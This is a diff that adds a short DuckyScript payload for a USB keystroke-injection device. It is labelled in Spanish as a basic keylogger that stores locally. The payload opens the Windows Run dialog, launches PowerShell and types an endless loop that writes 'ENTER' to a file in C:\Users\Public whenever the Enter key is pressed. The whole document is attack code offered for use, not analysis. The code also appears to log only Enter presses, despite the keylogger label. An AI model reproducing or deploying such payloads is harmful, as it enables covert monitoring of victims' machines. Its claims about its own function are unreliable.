@@ -1,0 +1,9 @@
+REM Keylogger básico (Almacén local)
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING $path = "C:\Users\Public\keystrokes.txt"; Add-Type -AssemblyName PresentationCore; while ($true) { Start-Sleep -Milliseconds 200; $key = [System.Windows.Input.Keyboard]::GetKeyStates([System.Windows.Input.Key]::Enter); if ($key -eq "Pressed") { Add-Content $path "ENTER"; } }
+ENTER
